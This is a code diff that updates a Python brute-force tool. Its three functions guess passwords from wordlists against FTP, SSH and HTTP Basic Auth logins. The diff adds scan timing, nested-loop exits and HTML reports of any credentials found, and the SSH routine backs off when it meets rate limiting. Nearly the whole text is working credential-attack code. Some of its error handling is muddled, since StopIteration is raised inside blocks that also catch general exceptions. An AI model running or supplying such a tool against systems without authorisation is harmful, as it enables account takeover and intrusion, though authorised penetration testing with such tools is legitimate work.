@@ -40,32 +40,54 @@ def run_ftp_bruteforce():
 
 
     print(f"\n[🔍] Starting brute-force on {target}:{port}...\n")
+    start_time = time.time()
+    found_credentials = None
 
-    for username in usernames:
-        for password in passwords:
-            try:
-                ftp = ftplib.FTP()
-                ftp.connect(target, port, timeout=3)
-                ftp.login(username, password)
-                print(f"[✅] SUCCESS: {username}:{password}")
-                ftp.quit()                
-                lines = [
-                    f"Target: {target}:{port}",
-                    f"Service: FTP",
-                    f"Credentials: {username}:{password}"
-                ]
-                write_html_section("Brute-Force Results", lines)
-                print("[💾] Appended to report.html")
-                input("Press Enter to return...")
-                return
-            except ftplib.error_perm:
-                print(f"[❌] Failed: {username}:{password}")
-            except Exception as e:
-                print(f"[⚠️ ] Error: {e}")
+    try:
+        for username in usernames:
+            for password in passwords:
+                try:
+                    ftp = ftplib.FTP()
+                    ftp.connect(target, port, timeout=3)
+                    ftp.login(username, password)
+                    print(f"[✅] SUCCESS: {username}:{password}")
+                    ftp.quit()
+                    found_credentials = f"{username}:{password}"
+                    # Break out of both loops if credentials are found
+                    raise StopIteration
+                except ftplib.error_perm:
+                    print(f"[❌] Failed: {username}:{password}")
+                except Exception as e:
+                    print(f"[⚠️ ] Error: {e}")
+                    # Decide if you want to break the inner loop or continue
+                    # For now, let's break the inner loop on other errors
+                    break
+            if found_credentials: # If found in inner loop, break outer
                 break
+    except StopIteration: # Custom signal to break from nested loops
+        pass
+    finally:
+        end_time = time.time()
+        duration = round(end_time - start_time, 2)
 
-    print("\n[❌] No valid credentials found.")
-    input("Press Enter to return...")
+        report_lines = [
+            f"Target: {target}:{port}",
+            f"Service: FTP",
+            f"Scan Duration: {duration} seconds",
+            f"Username Wordlist: {userlist_path}",
+            f"Password Wordlist: {passlist_path}",
+        ]
+        if found_credentials:
+            report_lines.append(f"Outcome: Credentials Found")
+            report_lines.append(f"Credentials: {found_credentials}")
+            status_message = "[✅] Credentials found and reported."
+        else:
+            report_lines.append(f"Outcome: No Credentials Found")
+            status_message = "[❌] No valid credentials found. Report generated."
+
+        write_html_section("FTP Brute-Force Results", report_lines)
+        print(f"\n[💾] {status_message} Appended to report.html")
+        input("Press Enter to return...")
 
 import os, time, random, paramiko
 from tqdm import tqdm  # install with: pip install tqdm
@@ -98,44 +120,64 @@ def run_ssh_bruteforce():
 
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    start_time = time.time()
+    found_password = None
 
-    for password in tqdm(passwords, desc="Trying passwords", unit="pw"):
-        try:
-            client.connect(
-                hostname=target,
-                port=port,
-                username=username,
-                password=password,
-                timeout=5,
-                auth_timeout=5,
-                banner_timeout=5,
-                allow_agent=False,
-                look_for_keys=False
-            )
-            print(f"\n[✅] SUCCESS! Credentials: {username}:{password}")
-            lines = [
-                f"Target: {target}:{port}",
-                f"Service: SSH",
-                f"Credentials: {username}:{password}"
-            ]
-            write_html_section("Brute-Force Results", lines)
-            print("[💾] Appended to report.html")
-            client.close()
-            break
+    try:
+        for password in tqdm(passwords, desc="Trying passwords", unit="pw"):
+            try:
+                client.connect(
+                    hostname=target,
+                    port=port,
+                    username=username,
+                    password=password,
+                    timeout=5,
+                    auth_timeout=5,
+                    banner_timeout=5,
+                    allow_agent=False,
+                    look_for_keys=False
+                )
+                tqdm.write(f"\n[✅] SUCCESS! Credentials: {username}:{password}")
+                found_password = password
+                client.close()
+                break  # Exit loop once password is found
+            except paramiko.AuthenticationException:
+                pass  # invalid login, ignore
+            except paramiko.SSHException as e:
+                tqdm.write(f"[⚠️ ] SSH error or rate-limiting detected: {e}")
+                time.sleep(random.uniform(5, 10)) # Wait a bit if SSH server is unhappy
+            except Exception as e:
+                tqdm.write(f"[❌] Unexpected error: {e}")
+            finally:
+                # Ensure client is closed if it was opened and an error occurred mid-connection attempt
+                # However, client.connect() might not always initialize the transport if it fails early.
+                if client._transport and client._transport.is_active():
+                    client.close()
+    finally:
+        end_time = time.time()
+        duration = round(end_time - start_time, 2)
 
-        except paramiko.AuthenticationException:
-            pass  # invalid login, ignore
-        except paramiko.SSHException as e:
-            tqdm.write(f"[⚠️ ] SSH error or rate-limiting detected: {e}")
-            time.sleep(random.uniform(5, 10))
-        except Exception as e:
-            tqdm.write(f"[❌] Unexpected error: {e}")
-        finally:
-            client.close()
-    else:
-        print("\n[❌] No valid password found.")
+        report_lines = [
+            f"Target: {target}:{port}",
+            f"Service: SSH",
+            f"Username: {username}",
+            f"Password Wordlist: {passlist_path}",
+            f"Scan Duration: {duration} seconds",
+        ]
 
-    input("Press Enter to return...")
+        if found_password:
+            report_lines.append(f"Outcome: Password Found")
+            report_lines.append(f"Credentials: {username}:{found_password}")
+            status_message = "[✅] Credentials found and reported."
+        else:
+            report_lines.append(f"Outcome: No Password Found")
+            status_message = "[❌] No valid password found. Report generated."
+            # This print was originally after the loop, moving it here to be part of the final status
+            print("\n[❌] No valid password found.")
+
+        write_html_section("SSH Brute-Force Results", report_lines)
+        print(f"[💾] {status_message} Appended to report.html")
+        input("Press Enter to return...")
 
 
 def run_http_bruteforce():
@@ -167,44 +209,75 @@ def run_http_bruteforce():
         return
 
     print(f"\n[🔍] Starting HTTP Basic Auth brute-force on {target_url}...\n")
+    start_time = time.time()
+    found_credentials = None
+    connection_error_occurred = False
 
-    for username in tqdm(usernames, desc="Usernames", unit="user"):
-        for password in tqdm(passwords, desc="Passwords", unit="pass", leave=False):
-            try:
-                response = requests.get(target_url, auth=HTTPBasicAuth(username, password), timeout=5)
+    try:
+        for username in tqdm(usernames, desc="Usernames", unit="user"):
+            for password in tqdm(passwords, desc="Passwords", unit="pass", leave=False):
+                try:
+                    response = requests.get(target_url, auth=HTTPBasicAuth(username, password), timeout=5)
 
-                if response.status_code == 200:
-                    print(f"\n[✅] SUCCESS: {username}:{password} (Status: {response.status_code})")
-                    lines = [
-                        f"Target URL: {target_url}",
-                        f"Service: HTTP Basic Auth",
-                        f"Credentials: {username}:{password}"
-                    ]
-                    write_html_section("Brute-Force Results", lines)
-                    print("[💾] Appended to report.html")
-                    input("Press Enter to return...")
-                    return
-                elif response.status_code == 401:
-                    tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Unauthorized)")
-                elif response.status_code == 403:
-                    tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Forbidden)")
-                else:
-                    tqdm.write(f"[⚠️ ] Info: {username}:{password} (Status: {response.status_code})")
+                    if response.status_code == 200:
+                        tqdm.write(f"\n[✅] SUCCESS: {username}:{password} (Status: {response.status_code})")
+                        found_credentials = f"{username}:{password}"
+                        raise StopIteration # Signal to break from loops
+                    elif response.status_code == 401:
+                        tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Unauthorized)")
+                    elif response.status_code == 403:
+                        tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Forbidden)")
+                    else:
+                        tqdm.write(f"[⚠️ ] Info: {username}:{password} (Status: {response.status_code})")
 
-            except requests.exceptions.ConnectionError:
-                tqdm.write(f"[❌] Error: Could not connect to {target_url}. Check URL and connection.")
-                input("Press Enter to return...")
-                return
-            except requests.exceptions.Timeout:
-                tqdm.write(f"[⚠️ ] Timeout connecting to {target_url} for {username}:{password}. Retrying may be needed or increase timeout.")
-            except requests.exceptions.RequestException as e:
-                tqdm.write(f"[❌] Error for {username}:{password}: {e}")
+                except requests.exceptions.ConnectionError:
+                    tqdm.write(f"[❌] Error: Could not connect to {target_url}. Check URL and connection.")
+                    connection_error_occurred = True
+                    raise StopIteration # Signal to break from loops and go to finally
+                except requests.exceptions.Timeout:
+                    tqdm.write(f"[⚠️ ] Timeout for {username}:{password}. Server might be slow or rate-limiting.")
+                except requests.exceptions.RequestException as e:
+                    tqdm.write(f"[❌] Request error for {username}:{password}: {e}")
 
-            # Small delay to avoid overwhelming the server, can be adjusted
-            time.sleep(0.1)
+                if found_credentials or connection_error_occurred:
+                    break # Break inner password loop
 
-    print("\n[❌] No valid credentials found.")
-    input("Press Enter to return...")
+                time.sleep(0.1) # Small delay
+
+            if found_credentials or connection_error_occurred:
+                break # Break outer username loop
+
+    except StopIteration: # Handles breaking from nested loops
+        pass
+    finally:
+        end_time = time.time()
+        duration = round(end_time - start_time, 2)
+
+        report_lines = [
+            f"Target URL: {target_url}",
+            f"Service: HTTP Basic Auth",
+            f"Scan Duration: {duration} seconds",
+            f"Username Wordlist: {userlist_path}",
+            f"Password Wordlist: {passlist_path}",
+        ]
+
+        if connection_error_occurred:
+            report_lines.append("Outcome: Connection Error")
+            report_lines.append("Details: Could not connect to the target URL. Scan aborted.")
+            status_message = "[❌] Connection error. Report generated."
+        elif found_credentials:
+            report_lines.append("Outcome: Credentials Found")
+            report_lines.append(f"Credentials: {found_credentials}")
+            status_message = "[✅] Credentials found and reported."
+        else:
+            report_lines.append("Outcome: No Credentials Found")
+            status_message = "[❌] No valid credentials found. Report generated."
+            print("\n[❌] No valid credentials found.")
+
+
+        write_html_section("HTTP Basic Auth Brute-Force Results", report_lines)
+        print(f"\n[💾] {status_message} Appended to report.html")
+        input("Press Enter to return...")
 
 
 def run():
